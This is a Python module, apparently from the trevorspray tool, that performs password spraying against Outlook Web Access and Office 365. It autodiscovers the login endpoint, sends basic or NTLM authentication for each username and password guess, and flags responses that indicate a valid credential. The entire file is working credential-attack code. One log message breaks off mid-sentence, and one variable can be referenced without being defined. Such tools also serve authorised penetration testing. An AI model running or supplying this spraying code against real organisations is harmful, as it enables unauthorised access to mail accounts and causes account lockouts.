import logging
from ..util import ntlmdecode
from .base import BaseSprayModule
from tldextract import tldextract
from requests_ntlm import HttpNtlmAuth

log = logging.getLogger('trevorspray.sprayers.owa')

class OWA(BaseSprayModule):

    # HTTP method
    method = 'GET'
    # default target URL
    default_url = 'none'
    # HTTP headers
    headers = {
        "Content-Type": "text/xml"
    }

    def initialize(self):

        self.o365 = False
        if self.url != 'none':
            self.domain = str(tldextract.extract(self.url).fqdn)
        else:
            log.warning('No --url specified, autodetecting')
            if self.trevor.domain:
                self.domain = str(self.trevor.domain)
                log.info(f'Using domain "{self.trevor.domain}"')
                discovery = self.trevor.discovery(self.trevor.domain)
                self.url = discovery.autodiscover().get('Url', 'none')
            else:
                self.domain = 'office365.com'

        if self.url == 'none':
            self.url = 'https://outlook.office365.com/autodiscover/autodiscover.xml'
            log.warning(f'Failed to autodetect URL. Falling back to {self.url}')

        if tldextract.extract(self.url).domain in ['outlook.com', 'office365.com']:
            log.warning('NOTE: It is recommended that you ')
            self.o365 = True

        log.info(f'Using OWA URL: {self.url}')
        if not self.o365:
            discovery.owa_internal_domain(self.url)

        return True


    def create_request(self, username, password):
        '''
        Returns request.Request() object
        '''

        r = super().create_request(username, password)
        if self.o365:
            r.auth = (username, password)
        else:
            r.auth = HttpNtlmAuth(username, password)
        return r


    def check_response(self, response):

        exists = False
        valid = False
        locked = False
        msg = f'[{response}]'

        response_code = getattr(response, 'status_code', 0)
        if response_code in [200, 456]:
            exists = True
            valid = True
            msg = 'Valid credential!'
        if response_code == 456:
            msg += ' But login failed, please check manually (MFA, account locked, etc.)'

        return (valid, exists, locked, msg)
